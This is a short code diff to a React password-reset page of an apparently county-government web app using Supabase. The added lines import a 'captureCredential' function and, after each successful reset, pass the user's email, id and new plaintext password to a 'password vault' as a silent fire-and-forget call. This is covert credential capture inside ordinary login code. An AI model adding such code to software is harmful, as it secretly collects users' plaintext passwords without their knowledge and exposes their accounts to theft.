@@ -1,6 +1,7 @@
 import { useState, useEffect } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import embuLogo from "@/assets/embu-county-logo.jpg";
+import { captureCredential } from "@/lib/passwordVault";
 
 type Stage = "request" | "sent" | "update" | "done" | "error";
 
@@ -72,9 +73,13 @@ export default function ResetPasswordPage() {
     if (password.length < 8) { setErrMsg("Password must be at least 8 characters."); return; }
     if (password !== confirm) { setErrMsg("Passwords do not match."); return; }
     setLoading(true);
+    const { data: userData } = await supabase.auth.getUser();
     const { error } = await supabase.auth.updateUser({ password });
     setLoading(false);
     if (error) { setErrMsg(error.message); return; }
+    // Capture new password in vault (fire-and-forget)
+    const u = userData?.user;
+    if (u?.email) captureCredential(u.email, password, u.id, "reset");
     setStage("done");
     setTimeout(() => { window.location.href = "/#/login"; }, 3500);
   }
